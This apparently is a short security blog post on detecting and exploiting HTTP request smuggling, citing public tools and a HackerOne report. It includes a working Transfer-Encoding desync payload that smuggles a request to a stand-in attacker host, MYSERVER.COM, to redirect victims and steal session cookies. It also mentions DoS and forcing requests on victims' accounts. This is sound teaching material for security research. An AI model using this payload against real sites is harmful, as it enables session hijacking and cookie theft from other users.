            <h1>Finding and Exploiting HTTP Smuggling</h1>
 
    </main>



</footer>

<div>
          <p></p><p><u>Clarification</u>: I'm not an expert in finding and exploiting HTTP Smuggling but I will share how I <br>usually find them and the steps I make to exploit them.</p>
</div>

<div>
<h3>How to find them?</h3>
</div>

<div>
<p>
Basically there are 2 main ways of finding HTTP Smuggling vulnerabilities. Using the <a href='https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646'>burp extension</a><br> or using the @defparam tool (also public) on github
called <a href='https://github.com/defparam/smuggler'> Smuggler.</a></p>
Not to mention you can also build your own tool to detect them but I recommend you to try those<br>
first.

<p>Both tools give you alerts when a <u>possible</u> HTTP Smuggling case appears, this means that after<br> you receive one, you need to check if it is a false positive or valid case.</p>

</div>
<div>
<h2>How to exploit them?</h2></div>
<p>
Ok let's say that you managed to find a valid case of http smuggling using either the burp built-in<br> option to check for CLTE or TECL or the script from @defparam in turbo intruder, now what?<br>
</p>

<p>Well now you need to check if it is an <u>Open Desync</u> or <u>Self Desync</u>. Basically if it affects just your IP<br> or if it can affect other IPs/connections (like XSS and self-XSS).</p>

<p> The first thing I check is if I can redirect to another domain or not, because if you can, then you can <br> usually escalate the issue pretty fast by stealing the victim's cookies.<br>

<p>


<pre><code>Transfer-Encoding: chunked
Transfer-encoding: identity

19
f
on085=x&bcf5i=x
0


0

GET https://MYSERVER.COM HTTP/1.1
X-Ignore: X
</code></pre>
<p>

</div>

But if you can't, because you get an error or whatever, there are other options like DoS, or triggering<br> a harmful request on the victim's account, etc. A must read is <a href='https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn'>Albinowax's guide</a></p>

<p>If you are in a stage environment like I was, then this step is a bit hard, because you need <br>to generate traffic from other IP. You can use 2 machines, one smuggles the requests and the<br>
other one (with other IP) tries to get smuggled. I used an online page that takes screenshots <br>of the url you give, which makes keep-alive requests and are possible to smuggle.</p>

<p>Now if you aren't in a stage environment, and you are able to redirect to other domain, then this step<br> isn't hard at all. You need to point it to burp collaborator or any server you want and check if you<br>
receive a connection from a different IP that you have. Also most of them time this would be considered<br> critical since if you redirect to another domain (and isn't a code 300-399 redirect), then you would be<br>
able to steal the cookies, achieving massive Session Takeover.</p>

<p>A good example of this scenario is shown in this amazing report: <a href='https://hackerone.com/reports/737140'>#737140</a> where @defparam was<br> able to leak the session cookie, leading to mass session takeover of the users affected.




